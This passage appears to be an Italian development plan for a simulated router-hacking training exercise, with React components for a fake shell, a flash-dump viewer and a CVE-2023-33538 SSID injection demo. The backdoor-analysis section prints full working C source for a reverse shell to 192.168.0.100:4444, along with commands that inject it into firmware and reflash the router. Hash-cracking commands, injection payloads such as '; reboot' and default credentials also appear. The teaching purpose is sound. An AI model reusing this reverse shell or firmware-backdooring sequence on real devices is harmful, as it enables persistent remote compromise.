      const path = args[0] ? resolvePath(args[0]) : currentPath;
      const node = getNode(path);

      if (!node) return [`ls: ${args[0]}: No such file or directory`];
      if (node.type !== 'directory') return [args[0] || path];

      return Object.keys(node.children || {});
    },

    cd: (args) => {
      if (!args[0]) return [];
      const newPath = resolvePath(args[0]);
      const node = getNode(newPath);

      if (!node) return [`cd: ${args[0]}: No such file or directory`];
      if (node.type !== 'directory') return [`cd: ${args[0]}: Not a directory`];

      setCurrentPath(newPath);
      return [];
    },

    pwd: () => {
      return [currentPath];
    },

    cat: (args) => {
      if (!args[0]) return ['cat: missing operand'];
      const path = resolvePath(args[0]);
      const node = getNode(path);

      if (!node) return [`cat: ${args[0]}: No such file or directory`];
      if (node.type === 'directory') return [`cat: ${args[0]}: Is a directory`];

      return (node.content || '').split('\n');
    },

    mount: () => {
      return [
        '/dev/mtdblock2 on / type squashfs (ro,relatime)',
        '/proc on /proc type proc (rw,relatime)',
        'devpts on /dev/pts type devpts (rw,relatime,mode=622)',
        'none on /tmp type ramfs (rw,relatime)',
        'none on /var type ramfs (rw,relatime)',
      ];
    },

    'strings': (args) => {
      if (!args[0]) return ['strings: missing file operand'];

      // Special case: strings on /dev/mtdblock3 (config partition)
      if (args[0].includes('mtdblock3')) {
        return [
          '...',
          'admin21232f297a57a5a743894a0e4a801fc3',
          '97928270',
          '...',
          'TP-LINK_807C',
          '...',
        ];
      }

      return ['Binary file content...'];
    },

    file: (args) => {
      if (!args[0]) return ['file: missing operand'];
      const path = resolvePath(args[0]);
      const node = getNode(path);

      if (!node) return [`file: ${args[0]}: No such file or directory`];

      if (args[0].includes('busybox')) {
        return [`${args[0]}: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header`];
      }

      return [`${args[0]}: ${node.content || 'data'}`];
    },

    whoami: () => ['root'],

    id: () => ['uid=0(root) gid=0(root) groups=0(root)'],

    uname: (args) => {
      if (args.includes('-a')) {
        return ['Linux (none) 2.6.31 #61 Tue Jun 16 14:17:33 CST 2015 mips GNU/Linux'];
      }
      return ['Linux'];
    },

    help: () => {
      return [
        'Available commands:',
        '  ls, cd, pwd, cat, mount, file, strings',
        '  whoami, id, uname, help, clear',
        '',
        'Special files to explore:',
        '  /etc/passwd, /etc/shadow - User credentials',
        '  /proc/mtd - Flash partitions',
        '  /dev/mtdblock3 - Config partition (use strings)',
        '  /usr/bin/httpd - Vulnerable web server',
        '  /usr/bin/backdoorTest - Supply chain backdoor',
        '  /etc/rc.d/rcS - Startup script',
      ];
    },

    clear: () => {
      setOutput([]);
      return [];
    },
  };

  const executeCommand = (cmd: string) => {
    const [command, ...args] = cmd.split(/\s+/);
    const handler = commands[command];

    setOutput(prev => [...prev, `# ${cmd}`]);

    if (handler) {
      const result = handler(args);
      setOutput(prev => [...prev, ...result]);
    } else if (cmd.trim()) {
      setOutput(prev => [...prev, `${command}: command not found`]);
    }

    setOutput(prev => [...prev, '']);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      if (input.trim()) {
        setCommandHistory(prev => [...prev, input]);
        executeCommand(input);
      } else {
        setOutput(prev => [...prev, '']);
      }
      setInput('');
      setHistoryIndex(-1);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const newIndex = historyIndex < commandHistory.length - 1 ? historyIndex + 1 : historyIndex;
        setHistoryIndex(newIndex);
        setInput(commandHistory[commandHistory.length - 1 - newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const newIndex = historyIndex - 1;
        setHistoryIndex(newIndex);
        setInput(commandHistory[commandHistory.length - 1 - newIndex]);
      } else {
        setHistoryIndex(-1);
        setInput('');
      }
    }
  };

  return (
    <div className="flex flex-col h-full bg-black text-green-400 font-mono text-sm p-4">
      <div className="flex-1 overflow-y-auto whitespace-pre-wrap mb-2">
        {output.map((line, i) => (
          <div key={i}>{line}</div>
        ))}
      </div>

      <div className="flex items-center gap-2 border-t border-gray-700 pt-2">
        <span className="text-red-500">#</span>
        <input
          type="text"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          className="flex-1 bg-transparent outline-none text-green-400"
          placeholder="Type 'help' for available commands"
          autoFocus
        />
      </div>
    </div>
  );
}
```

**Effort**: 🔨🔨🔨🔨 (3 giorni)

---

## 🔓 STEP 5: ANALISI FLASH MEMORY

### Obiettivo
Simulare il dump e l'analisi della partizione config per estrarre credenziali.

### Implementazione

**5.1 Flash Dump Viewer**

```typescript
// src/components/features/exercise/FlashDumpViewer.tsx

'use client';

import { useState } from 'react';
import { Download, Search, AlertCircle } from 'lucide-react';

interface FlashPartition {
  name: string;
  offset: string;
  size: string;
  description: string;
  dumpAvailable: boolean;
  content?: string;
}

const partitions: FlashPartition[] = [
  {
    name: 'u-boot',
    offset: '0x000000',
    size: '128 KB',
    description: 'Bootloader U-Boot 1.1.4',
    dumpAvailable: true,
    content: 'Binary bootloader data...',
  },
  {
    name: 'kernel',
    offset: '0x020000',
    size: '1024 KB',
    description: 'Linux Kernel 2.6.31 compressed',
    dumpAvailable: true,
    content: 'ELF kernel image...',
  },
  {
    name: 'rootfs',
    offset: '0x120000',
    size: '2816 KB',
    description: 'Root filesystem (SquashFS)',
    dumpAvailable: true,
    content: 'SquashFS filesystem image...',
  },
  {
    name: 'config',
    offset: '0x3e0000',
    size: '64 KB',
    description: '⚠️ Configuration partition - Contains credentials!',
    dumpAvailable: true,
    content: `00000000: ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  ................
00000010: 61 64 6d 69 6e 32 31 32  33 32 66 32 39 37 61 35  admin21232f297a5
00000020: 37 61 35 61 37 34 33 38  39 34 61 30 65 34 61 38  7a5a743894a0e4a8
00000030: 30 31 66 63 33 00 00 00  00 00 00 00 00 00 00 00  01fc3...........
00000040: 39 37 39 32 38 32 37 30  00 00 00 00 00 00 00 00  97928270........
00000050: ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  ................
...
00000200: 54 50 2d 4c 49 4e 4b 5f  38 30 37 43 00 00 00 00  TP-LINK_807C....
`,
  },
  {
    name: 'art',
    offset: '0x3f0000',
    size: '64 KB',
    description: 'Atheros Radio Test (WiFi calibration)',
    dumpAvailable: false,
  },
];

export function FlashDumpViewer() {
  const [selectedPartition, setSelectedPartition] = useState<FlashPartition | null>(null);
  const [analysis, setAnalysis] = useState<string[]>([]);

  const analyzeConfigPartition = () => {
    setAnalysis([
      '🔍 Analyzing config partition...',
      '',
      '✅ Found credentials at offset 0x10:',
      '   Username: admin',
      '   Password Hash: 21232f297a57a5a743894a0e4a801fc3',
      '   Hash Type: MD5 (unsalted)',
      '',
      '🔓 Cracking hash with hashcat...',
      '   $ echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt',
      '   $ hashcat -m 0 -a 0 hash.txt rockyou.txt',
      '',
      '   Hash cracked: admin',
      '   (Password is literally "admin" - MD5("admin"))',
      '',
      '✅ Found WPA key at offset 0x40:',
      '   Default WPA Password: 97928270',
      '',
      '✅ Found SSID at offset 0x200:',
      '   SSID: TP-LINK_807C',
      '',
      '⚠️ SECURITY ISSUE:',
      '   - Admin password stored as unsalted MD5',
      '   - WPA key stored in plaintext',
      '   - No encryption or secure storage',
      '   - Physical access = full compromise',
      '',
      '🎯 Flag part unlocked: config_dump_analysis',
    ]);
  };

  return (
    <div className="flex h-full bg-gray-900">
      {/* Partition List */}
      <div className="w-1/3 border-r border-gray-700 p-4 overflow-y-auto">
        <h3 className="text-lg font-semibold text-white mb-4">Flash Partitions</h3>
        <div className="space-y-2">
          {partitions.map(partition => (
            <button
              key={partition.name}
              onClick={() => setSelectedPartition(partition)}
              className={cn(
                "w-full text-left p-3 rounded border transition",
                selectedPartition?.name === partition.name
                  ? "bg-blue-600 border-blue-500"
                  : "bg-gray-800 border-gray-700 hover:bg-gray-750"
              )}
            >
              <div className="flex items-center justify-between mb-1">
                <span className="font-mono text-sm text-white">{partition.name}</span>
                <span className="text-xs text-gray-400">{partition.size}</span>
              </div>
              <p className="text-xs text-gray-400">{partition.description}</p>
              <div className="flex items-center gap-2 mt-2">
                <span className="text-xs text-gray-500">Offset: {partition.offset}</span>
                {partition.dumpAvailable && (
                  <span className="text-xs text-green-400">✓ Dumpable</span>
                )}
              </div>
            </button>
          ))}
        </div>
      </div>

      {/* Partition Details */}
      <div className="flex-1 flex flex-col">
        {selectedPartition ? (
          <>
            {/* Header */}
            <div className="p-4 border-b border-gray-700">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-xl font-semibold text-white">{selectedPartition.name}</h3>
                  <p className="text-sm text-gray-400 mt-1">{selectedPartition.description}</p>
                </div>
                {selectedPartition.dumpAvailable && (
                  <div className="flex gap-2">
                    {selectedPartition.name === 'config' && (
                      <button
                        onClick={analyzeConfigPartition}
                        className="flex items-center gap-2 px-4 py-2 bg-yellow-600 hover:bg-yellow-700 rounded text-white text-sm transition"
                      >
                        <Search className="w-4 h-4" />
                        Analyze
                      </button>
                    )}
                    <button className="flex items-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-700 rounded text-white text-sm transition">
                      <Download className="w-4 h-4" />
                      Download Dump
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Content */}
            <div className="flex-1 overflow-y-auto p-4">
              {selectedPartition.name === 'config' && analysis.length > 0 ? (
                <div className="bg-black p-4 rounded font-mono text-xs text-green-400 whitespace-pre-wrap">
                  {analysis.join('\n')}
                </div>
              ) : selectedPartition.content ? (
                <div className="bg-black p-4 rounded font-mono text-xs text-green-400">
                  {selectedPartition.content}
                </div>
              ) : (
                <div className="flex items-center justify-center h-full text-gray-500">
                  <div className="text-center">
                    <AlertCircle className="w-12 h-12 mx-auto mb-2" />
                    <p>No dump available for this partition</p>
                  </div>
                </div>
              )}
            </div>
          </>
        ) : (
          <div className="flex items-center justify-center h-full text-gray-500">
            <p>Select a partition to view its dump</p>
          </div>
        )}
      </div>
    </div>
  );
}
```

**Effort**: 🔨🔨🔨 (2 giorni)

---

## 🐛 STEP 6: CVE-2023-33538 - SSID INJECTION

### Obiettivo
Simulare la vulnerabilità di command injection tramite SSID.

### Implementazione

**6.1 Web Admin Panel Simulator**

```typescript
// src/components/features/exercise/WebAdminPanel.tsx

'use client';

import { useState } from 'react';
import { AlertTriangle, Wifi, Save, RotateCw } from 'lucide-react';

export function WebAdminPanel() {
  const [ssid, setSsid] = useState('TP-LINK_807C');
  const [password, setPassword] = useState('97928270');
  const [showWarning, setShowWarning] = useState(false);
  const [deviceState, setDeviceState] = useState<'normal' | 'rebooting' | 'bootloop'>('normal');
  const [bootCount, setBootCount] = useState(0);
  const [vulnerabilityTriggered, setVulnerabilityTriggered] = useState(false);

  const checkSSIDVulnerability = (value: string): boolean => {
    // Detect command injection attempts
    const dangerousPatterns = [
      /;.*reboot/i,
      /;.*rm/i,
      /;.*shutdown/i,
      /`.*`/,
      /\$\(.*\)/,
    ];

    return dangerousPatterns.some(pattern => pattern.test(value));
  };

  const handleSaveConfig = () => {
    if (checkSSIDVulnerability(ssid)) {
      setShowWarning(true);
      setVulnerabilityTriggered(true);

      // Simulate reboot
      setDeviceState('rebooting');

      setTimeout(() => {
        // Enter bootloop if SSID contains reboot command
        if (ssid.includes('reboot')) {
          setDeviceState('bootloop');
          simulateBootloop();
        } else {
          setDeviceState('normal');
        }
      }, 3000);
    } else {
      alert('Configuration saved successfully!');
    }
  };

  const simulateBootloop = () => {
    let count = 0;
    const interval = setInterval(() => {
      count++;
      setBootCount(count);

      if (count >= 5) {
        clearInterval(interval);
      }
    }, 2000);
  };

  return (
    <div className="flex flex-col h-full bg-gray-100">
      {/* Admin Header */}
      <div className="bg-blue-600 text-white p-4">
        <h1 className="text-xl font-semibold">TP-Link TL-WR841N</h1>
        <p className="text-sm">Wireless Settings</p>
      </div>

      {/* Main Content */}
      <div className="flex-1 p-6 overflow-y-auto">
        <div className="max-w-2xl mx-auto bg-white rounded-lg shadow p-6">
          <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
            <Wifi className="w-5 h-5" />
            Wireless Network Configuration
          </h2>

          {/* SSID Field */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Network Name (SSID)
            </label>
            <input
              type="text"
              value={ssid}
              onChange={(e) => {
                setSsid(e.target.value);
                if (checkSSIDVulnerability(e.target.value)) {
                  setShowWarning(true);
                } else {
                  setShowWarning(false);
                }
              }}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Enter SSID"
            />

            {showWarning && (
              <div className="mt-2 p-3 bg-red-50 border border-red-300 rounded flex items-start gap-2">
                <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                <div className="text-sm text-red-700">
                  <p className="font-semibold">⚠️ Command Injection Detected!</p>
                  <p className="mt-1">
                    L'SSID contiene caratteri o comandi potenzialmente pericolosi.
                    Il firmware vulnerable eseguirà: <code className="bg-red-100 px-1 rounded">iwconfig ath0 essid {ssid}</code>
                  </p>
                  <p className="mt-2 text-xs">
                    Questo è CVE-2023-33538: SSID Command Injection
                  </p>
                </div>
              </div>
            )}
          </div>

          {/* Password Field */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              WPA Password
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>

          {/* Save Button */}
          <button
            onClick={handleSaveConfig}
            disabled={deviceState !== 'normal'}
            className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white rounded transition"
          >
            <Save className="w-4 h-4" />
            Save Configuration
          </button>

          {/* Vulnerability Explanation */}
          {vulnerabilityTriggered && (
            <div className="mt-6 p-4 bg-yellow-50 border border-yellow-300 rounded">
              <h3 className="font-semibold text-yellow-800 mb-2">🐛 Vulnerability Triggered</h3>
              <div className="text-sm text-yellow-700 space-y-2">
                <p>
                  <strong>CVE-2023-33538:</strong> SSID Command Injection
                </p>
                <p>
                  Il binario <code>/usr/bin/httpd</code> non sanitizza l'input SSID prima di passarlo a <code>iwconfig</code>:
                </p>
                <pre className="bg-yellow-100 p-2 rounded text-xs overflow-x-auto">
{`// Codice vulnerable in httpd (Ghidra decompilation)
execFormatCmd("iwconfig %s essid %s", ifname, user_ssid);
// user_ssid NON è validato!`}
                </pre>
                <p>
                  Con SSID <code>"; reboot"</code>, il comando diventa:
                </p>
                <pre className="bg-yellow-100 p-2 rounded text-xs">
iwconfig ath0 essid "; reboot"
                </pre>
                <p className="font-semibold mt-2">
                  Risultato: Il router si riavvia immediatamente e entra in bootloop infinito!
                </p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Device State Indicator */}
      {deviceState !== 'normal' && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-900 border-2 border-red-500 rounded-lg p-8 max-w-md text-center">
            <RotateCw className={cn(
              "w-16 h-16 mx-auto mb-4",
              deviceState === 'bootloop' ? "text-red-500 animate-spin" : "text-yellow-500"
            )} />

            {deviceState === 'rebooting' && (
              <>
                <h3 className="text-xl font-semibold text-white mb-2">Device Rebooting...</h3>
                <p className="text-gray-400">Il router si sta riavviando...</p>
              </>
            )}

            {deviceState === 'bootloop' && (
              <>
                <h3 className="text-xl font-semibold text-red-500 mb-2">⚠️ BOOTLOOP DETECTED</h3>
                <p className="text-gray-400 mb-4">
                  Il router è entrato in un loop infinito di riavvio!
                </p>
                <div className="bg-black p-3 rounded font-mono text-xs text-green-400 mb-4">
                  Boot cycle: {bootCount}/∞<br/>
                  SSID loaded: "{ssid}"<br/>
                  Executing: iwconfig ath0 essid "{ssid}"<br/>
                  → Command executed: reboot<br/>
                  → Rebooting...<br/>
                </div>
                <p className="text-sm text-yellow-400 mb-4">
                  Il tasto reset hardware NON funziona perché il router è occupato nel boot.
                </p>
                <div className="bg-blue-900/30 border border-blue-500 rounded p-3 text-left text-sm">
                  <p className="font-semibold text-blue-400 mb-2">💡 Soluzione:</p>
                  <ul className="list-disc list-inside space-y-1 text-gray-300">
                    <li>Dumpare firmware con CH341A programmer</li>
                    <li>Modificare SSID corrotto nel dump</li>
                    <li>Reflashare firmware modificato</li>
                  </ul>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
```

**Effort**: 🔨🔨🔨🔨 (3 giorni)

---

## 🔐 STEP 7: BACKDOOR SUPPLY CHAIN

### Obiettivo
Simulare la scoperta e analisi di una backdoor inserita nel firmware.

### Implementazione

**7.1 Backdoor Code Viewer**

```typescript
// src/components/features/exercise/BackdoorAnalysis.tsx

'use client';

import { useState } from 'react';
import { FileCode, Terminal, AlertTriangle, CheckCircle } from 'lucide-react';

const backdoorSourceCode = `#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main() {
    int sock;
    struct sockaddr_in addr = {0};
    int retries = 10;
    int delay = 2; // Seconds between retries

    while (retries > 0) {
        // Create a TCP socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            return 1;
        }

        // Set up the remote address
        addr.sin_family = AF_INET;
        addr.sin_port = htons(4444);
        addr.sin_addr.s_addr = inet_addr("192.168.0.100");

        // Attempt to connect
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            break; // Connection successful
        }

        fprintf(stderr, "connect failed: %s, retrying (%d left)\\n",
                strerror(errno), retries);
        close(sock);
        sleep(delay);
        retries--;
    }

    if (retries == 0) {
        fprintf(stderr, "All connection attempts failed\\n");
        return 1;
    }

    // Redirect stdin, stdout, and stderr to the socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute /bin/sh
    execl("/bin/sh", "/bin/sh", NULL);

    perror("execl");
    close(sock);
    return 1;
}`;

const rcSModified = `#!/bin/sh
# Startup script

# Mount filesystems
mount -a

# Network init
/usr/sbin/config-usbnet.sh

# ⚠️ BACKDOOR: Start reverse shell
/usr/bin/backdoorTest &

# Start httpd (WEB SERVER)
/usr/bin/httpd &

# Start dropbear SSH
/usr/sbin/dropbear

echo "Boot complete"
`;

export function BackdoorAnalysis() {
  const [step, setStep] = useState(0);
  const [analysisResults, setAnalysisResults] = useState<string[]>([]);

  const steps = [
    {
      title: 'Scoperta del Binario Sospetto',
      description: 'Durante l\'esplorazione del filesystem, notiamo un binario insolito in /usr/bin/',
      action: () => {
        setAnalysisResults([
          '# ls -la /usr/bin/',
          'total 5128',
          'drwxr-xr-x    2 root     root          1024 Jun 16  2015 .',
          'drwxr-xr-x    3 root     root          1024 Jun 16  2015 ..',
          '-rwxr-xr-x    1 root     root        245760 Jun 16  2015 dropbear',
          '-rwxr-xr-x    1 root     root       4872316 Jun 16  2015 httpd',
          '-rwxr-xr-x    1 root     root        133184 Jun 16  2015 backdoorTest ← SOSPETTO!',
          '',
          '⚠️ backdoorTest non è un binario standard di TP-Link!',
        ]);
      },
    },
    {
      title: 'Analisi con file',
      description: 'Verifichiamo il tipo di file e l\'architettura',
      action: () => {
        setAnalysisResults([
          '# file /usr/bin/backdoorTest',
          '/usr/bin/backdoorTest: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, not stripped',
          '',
          '✓ Architettura corretta: MIPS32 big-endian',
          '✓ Statically linked: nessuna dipendenza esterna',
          '✓ Not stripped: simboli di debug presenti',
          '',
          '⚠️ Compilato staticamente è sospetto per backdoor',
        ]);
      },
    },
    {
      title: 'Strings Analysis',
      description: 'Estraiamo le stringhe leggibili dal binario',
      action: () => {
        setAnalysisResults([
          '# strings /usr/bin/backdoorTest | grep -E "(socket|connect|192|/bin)"',
          'socket',
          'connect',
          '192.168.0.100',
          '/bin/sh',
          'connect failed: %s, retrying (%d left)',
          'All connection attempts failed',
          '',
          '🚨 RED FLAGS:',
          '  - Hardcoded IP: 192.168.0.100',
          '  - Esegue /bin/sh',
          '  - Network socket operations',
          '  - Retry logic → persistenza',
        ]);
      },
    },
    {
      title: 'Verifica Avvio Automatico',
      description: 'Controlliamo se il binario viene eseguito all\'avvio',
      action: () => {
        setAnalysisResults([
          '# cat /etc/rc.d/rcS | grep backdoor',
          '/usr/bin/backdoorTest &',
          '',
          '🚨 CONFERMATO: Il backdoor si avvia automaticamente al boot!',
          '',
          'Analisi startup script completo:',
          rcSModified.split('\n').map((line, i) =>
            line.includes('backdoorTest')
              ? `\x1b[31m${line}\x1b[0m ← BACKDOOR INJECTION`
              : line
          ).join('\n'),
        ]);
      },
    },
    {
      title: 'Decompilazione Codice',
      description: 'Ricostruiamo la logica del backdoor',
      action: () => {
        setAnalysisResults([
          '📝 Source code ricostruito (equivalente):',
          '',
          backdoorSourceCode,
          '',
          '🎯 Funzionamento:',
          '1. Al boot, backdoorTest si avvia in background (&)',
          '2. Tenta connessione TCP a 192.168.0.100:4444',
          '3. Retry ogni 2 secondi per 10 tentativi',
          '4. Se connette: redirige stdin/stdout/stderr al socket',
          '5. Esegue /bin/sh → Reverse Shell!',
          '',
          '💀 Tipo di attacco: REVERSE SHELL BACKDOOR',
          '🎯 Target: 192.168.0.100:4444',
          '⚙️ Persistenza: Avvio automatico via /etc/rc.d/rcS',
        ]);
      },
    },
    {
      title: 'Supply Chain Attack',
      description: 'Come è stato inserito questo backdoor?',
      action: () => {
        setAnalysisResults([
          '🔍 Supply Chain Attack Simulation',
          '',
          'Step 1: COMPILAZIONE BACKDOOR',
          '  $ mips-linux-gcc -static backdoorTest.c -o backdoorTest',
          '',
          'Step 2: ESTRAZIONE FIRMWARE',
          '  $ dd if=firmware.bin of=squashfs.img skip=1179648 count=2794097 bs=1',
          '  $ sudo unsquashfs squashfs.img',
          '',
          'Step 3: INJECTION NEL ROOTFS',
          '  $ cp backdoorTest squashfs-root/usr/bin/',
          '  $ echo "/usr/bin/backdoorTest &" >> squashfs-root/etc/rc.d/rcS',
          '',
          'Step 4: RICOSTRUZIONE FIRMWARE',
          '  $ mksquashfs squashfs-root/ newsquashfs.img -comp lzma -no-xattrs -noappend',
          '  $ dd if=newsquashfs.img of=firmware.bin bs=1 seek=1179648 conv=notrunc',
          '',
          'Step 5: REFLASH SUL ROUTER',
          '  $ flashrom -p ch341a_spi -w firmware.bin -c W25Q32BV',
          '',
          '✅ Backdoor persistente inserito!',
          '',
          '🎯 Flag unlocked: supply_chain_backdoor',
        ]);
      },
    },
  ];

  return (
    <div className="flex flex-col h-full bg-gray-900">
      {/* Header */}
      <div className="bg-red-900 text-white p-4 border-b border-red-700">
        <h1 className="text-xl font-semibold flex items-center gap-2">
          <AlertTriangle className="w-6 h-6" />
          Backdoor Analysis - Supply Chain Attack
        </h1>
        <p className="text-sm text-red-200 mt-1">
          Analisi di un backdoor reverse shell inserito nel firmware
        </p>
      </div>

      {/* Progress */}
      <div className="bg-gray-800 p-4 border-b border-gray-700">
        <div className="flex items-center justify-between mb-2">
          <span className="text-sm text-gray-400">Progresso Analisi</span>
          <span className="text-sm text-white">{step + 1} / {steps.length}</span>
        </div>
        <div className="w-full bg-gray-700 rounded-full h-2">
          <div
            className="bg-red-500 h-2 rounded-full transition-all duration-300"
            style={{ width: `${((step + 1) / steps.length) * 100}%` }}
          />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex overflow-hidden">
        {/* Steps Sidebar */}
        <div className="w-64 bg-gray-800 border-r border-gray-700 p-4 overflow-y-auto">
          <h3 className="text-sm font-semibold text-gray-400 mb-3">STEP DI ANALISI</h3>
          <div className="space-y-2">
            {steps.map((s, i) => (
              <button
                key={i}
                onClick={() => {
                  setStep(i);
                  s.action();
                }}
                className={cn(
                  "w-full text-left p-3 rounded border transition",
                  step === i
                    ? "bg-red-600 border-red-500 text-white"
                    : i < step
                    ? "bg-green-900/30 border-green-700 text-green-400"
                    : "bg-gray-700 border-gray-600 text-gray-400 hover:bg-gray-650"
                )}
              >
                <div className="flex items-center gap-2 mb-1">
                  {i < step && <CheckCircle className="w-4 h-4 text-green-400" />}
                  {i === step && <Terminal className="w-4 h-4" />}
                  <span className="text-xs font-mono">Step {i + 1}</span>
                </div>
                <p className="text-xs font-medium">{s.title}</p>
              </button>
            ))}
          </div>
        </div>

        {/* Analysis Output */}
        <div className="flex-1 flex flex-col overflow-hidden">
          <div className="bg-gray-800 p-4 border-b border-gray-700">
            <h3 className="text-lg font-semibold text-white">{steps[step].title}</h3>
            <p className="text-sm text-gray-400 mt-1">{steps[step].description}</p>
          </div>

          <div className="flex-1 overflow-y-auto p-4">
            {analysisResults.length === 0 ? (
              <div className="flex items-center justify-center h-full text-gray-500">
                <div className="text-center">
                  <FileCode className="w-12 h-12 mx-auto mb-2" />
                  <p>Click su uno step per iniziare l'analisi</p>
                </div>
              </div>
            ) : (
              <div className="bg-black p-4 rounded font-mono text-sm text-green-400 whitespace-pre-wrap">
                {analysisResults.join('\n')}
              </div>
            )}
          </div>

          {/* Next Step Button */}
          {step < steps.length - 1 && analysisResults.length > 0 && (
            <div className="p-4 bg-gray-800 border-t border-gray-700">
              <button
                onClick={() => {
                  const nextStep = step + 1;
                  setStep(nextStep);
                  steps[nextStep].action();
                }}
                className="w-full px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded transition"
              >
                Prossimo Step →
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
```

**Effort**: 🔨🔨🔨🔨 (3 giorni)

---

## 📊 STRUTTURA DATI ESERCIZI

### Organizzazione Multi-Livello

```typescript
// src/data/exercises/index.ts

export interface ExerciseLevel {
  id: string;
  title: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  estimatedTime: string;
  steps: ExerciseStep[];
  prerequisites?: string[];
}

export interface ExerciseStep {
  id: string;
  title: string;
  type: 'hardware' | 'uart' | 'uboot' | 'shell' | 'flash' | 'exploit' | 'backdoor';
  component?: string; // Per type='hardware'
  instructions: string;
  hints: HintLevel[];
  validation?: () => boolean;
  flagPart?: string;
  toolRequired?: Tool;
}

export interface HintLevel {
  level: 1 | 2 | 3;
  text: string;
  penaltyPoints: number;
}

// Esempio di esercizio completo
export const tplinkWR841NExercise: ExerciseLevel = {
  id: 'tplink-wr841n-full',
  title: 'TP-Link WR841N - Complete Hardware Hacking',
  difficulty: 'advanced',
  estimatedTime: '3-4 hours',
  prerequisites: ['basic-pcb-analysis', 'linux-fundamentals'],

  steps: [
    // LEVEL 1: Hardware Identification
    {
      id: 'hw-cpu',
      title: 'Identify the CPU',
      type: 'hardware',
      component: 'cpu',
      toolRequired: 'magnifier',
      instructions: 'Locate and identify the main processor on the PCB...',
      hints: [
        { level: 1, text: 'Look for the largest square chip', penaltyPoints: 5 },
        { level: 2, text: 'It\'s in the center of the board', penaltyPoints: 10 },
        { level: 3, text: 'Coordinates: X:42-58%, Y:38-56%', penaltyPoints: 20 },
      ],
      flagPart: 'QCA9533',
    },

    // LEVEL 2: UART Access
    {
      id: 'uart-access',
      title: 'Access UART Console',
      type: 'uart',
      toolRequired: 'uart',
      instructions: 'Connect to the UART console and capture the bootlog...',
      hints: [
        { level: 1, text: 'Look for 4 pins labeled J1', penaltyPoints: 5 },
        { level: 2, text: 'Pin RX has a broken trace', penaltyPoints: 10 },
      ],
      flagPart: 'uart_115200',
    },

    // LEVEL 3: U-Boot
    {
      id: 'uboot-interrupt',
      title: 'Interrupt U-Boot',
      type: 'uboot',
      toolRequired: 'uart',
      instructions: 'Interrupt the boot process and access U-Boot console...',
      hints: [
        { level: 1, text: 'Type "tpl" within 1 second', penaltyPoints: 5 },
      ],
      flagPart: 'bootargs_jffs2',
    },

    // LEVEL 4: Root Shell
    {
      id: 'root-shell',
      title: 'Gain Root Shell Access',
      type: 'shell',
      toolRequired: 'terminal',
      instructions: 'Login to the system and obtain root shell...',
      hints: [
        { level: 1, text: 'Default credentials are weak', penaltyPoints: 5 },
        { level: 2, text: 'Try root:sohoadmin', penaltyPoints: 15 },
      ],
      flagPart: 'root_access',
    },

    // LEVEL 5: Flash Analysis
    {
      id: 'flash-dump',
      title: 'Analyze Flash Partitions',
      type: 'flash',
      toolRequired: 'terminal',
      instructions: 'Dump and analyze the config partition...',
      hints: [
        { level: 1, text: 'Use strings on /dev/mtdblock3', penaltyPoints: 10 },
      ],
      flagPart: 'md5_unsalted',
    },

    // LEVEL 6: CVE Exploitation
    {
      id: 'cve-ssid-injection',
      title: 'Exploit CVE-2023-33538',
      type: 'exploit',
      instructions: 'Trigger the SSID command injection vulnerability...',
      hints: [
        { level: 1, text: 'SSID input is not sanitized', penaltyPoints: 10 },
        { level: 2, text: 'Try SSID ending with ; reboot', penaltyPoints: 20 },
      ],
      flagPart: 'ssid_injection',
    },

    // LEVEL 7: Backdoor Discovery
    {
      id: 'backdoor-analysis',
      title: 'Discover Supply Chain Backdoor',
      type: 'backdoor',
      toolRequired: 'terminal',
      instructions: 'Find and analyze the reverse shell backdoor...',
      hints: [
        { level: 1, text: 'Check /usr/bin for suspicious binaries', penaltyPoints: 10 },
        { level: 2, text: 'Look at /etc/rc.d/rcS startup script', penaltyPoints: 15 },
      ],
      flagPart: 'supply_chain',
    },
  ],
};
```

---

## 🎨 COMPONENTI REACT DA IMPLEMENTARE

### Lista Completa

| Componente | Descrizione | Priorità | Effort |
|-----------|-------------|----------|--------|
| `PCBViewer` | ✅ Esistente, da estendere | 🔴 ALTA | 1 giorno |
